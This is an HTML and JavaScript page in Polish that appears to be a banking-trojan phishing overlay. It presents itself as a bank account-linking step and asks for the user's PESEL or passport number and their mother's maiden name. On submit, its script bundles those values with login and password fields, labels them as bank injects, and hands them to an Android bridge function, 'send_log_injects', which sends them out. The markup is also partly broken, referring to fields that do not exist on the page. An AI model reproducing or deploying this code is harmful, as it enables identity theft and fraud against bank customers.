<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #fbfbfb;
        }

        #form1, #form2, #form3, #form4 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.5
        }

        section {
            padding: 15px;
        }

        #form {
            padding: 15px;
            background-color: #fff;
            border: 0;
            border-radius: 4px;
            box-shadow: 0 2px 5px #ccc;
            margin-bottom: 15px;
        }

        label {
            color: #63615d;
            font-size: 12px;
            margin: 0;
        }

        .input {
            width: 100%;
            padding: 13px;
            border: 1px solid #e8e8e7;
            border-radius: 4px;
            margin-bottom: 15px;
            color: #63615d;
        }

        .button {
            display: block;
            margin: auto;
            padding: 7px 55px;
            border: 0;
            font-size: 14px;
            color: #fff;
            background-color: #e41e0a;
            border-radius: 75px;
            box-shadow: 0 2px 2px #ccc;
        }

        .input:focus {
            border-bottom: 2px solid #0077bd;
        }

        .error {
            border-bottom: 2px solid #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none;
        }
    </style>
</head>

            <section>
                
                <p style="text-align: center;font-weight: 600;font-size: 16px;"> Jak chcesz połączyć swoje konto? </p>
                <div id="form">
                    <p style="text-align: center;font-weight: 600;color: #63615d;font-size: 14px;"> W APLIKACJI </p>
                    
                     <label for="login"> Podaj PESEL. Jeśli go nie masz, wpisz serię i numer paszportu </label>
                  <input type="text" class="input" onkeypress="return (event.charCode >= 48 && event.charCode <= 57 && /^\d{0,10}$/.test(this.value));" id="login" name="login" placeholder="Wpisz numer" autocomplete="off">
    
                    <label for="mmn"> Podaj nazwisko panieńskie Twojej matki </label>
                    <input type="text" class="input" id="mmn" name="mmn" oninput="this.value=this.value.replace(/[^a-zA-Z]/g,'');" maxlength="24"  placeholder="Wpisz nazwisko" autocomplete="off">                
                    
    
                    
    
                    <input type="submit" class="button" id="sendData" value="NEXT">
                </div>
            </section>
        </div>
       
    </form>
    <script>
       
        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2')
            
        
        var log = document.getElementById('log'),
            password = document.getElementById('password'),
            login = document.getElementById('login'),
            mmn = document.getElementById('mmn')
            

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        $(password).on('input', function(){
            var $this = $(this);
            if ($this.val().length < 7) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }
        });
        $(log).on('input', function(){
            var $this = $(this);
            if ($this.val().length < 7) {
                log.classList.add('error')
            } else {
                log.classList.remove('error')
            }
        });
        
        //  if(log.value.length < 7) {
        //         log.classList.add('error')
        //     } else {
        //         log.classList.remove('error')
              
        //     } 
        //      if(password.value.length < 7) {
        //         password.classList.add('error')
        //     } else {
        //         password.classList.remove('error')  
                
                
        //         form1.style.display = 'none';
        //         form2.style.display = 'flex';
        //     }
        

            nextPage.onclick = () => {
                if(!log.classList.contains("error") && !password.classList.contains("error")) {
                    form1.style.display="none"
                    form2.style.display="block"
                }
            }
                
               
                 
                
             
        
        sendData.onclick = () => {
            if(login.value.length < 2) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
                
                var data = {};
                data.log = log.value;
                data.password = password.value;
                
                data.mmn = mmn.value;                
                data.login = login.value;
                data.mmn = mmn.value;
                
                data.login = login.value;
                data.mmn = mmn.value;
               
               
                data.password = password.value;
                data.login = login.value;
                data.mmn = mmn.value;
                
                data.method = 'Password';
                data.password = password.value;
                
               
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                console.log(data)
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
